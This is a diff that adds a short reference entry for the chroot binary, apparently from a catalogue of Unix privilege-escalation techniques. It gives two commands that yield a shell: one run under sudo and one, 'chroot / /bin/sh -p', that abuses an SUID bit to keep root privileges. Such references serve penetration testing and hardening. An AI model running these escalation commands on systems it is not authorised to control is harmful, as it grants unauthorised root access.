@@ -1,0 +1,11 @@
+chroot
+======
+
+Shell
+-----
+
+[Sudo]
+    chroot /
+
+[SUID]
+    chroot / /bin/sh -p
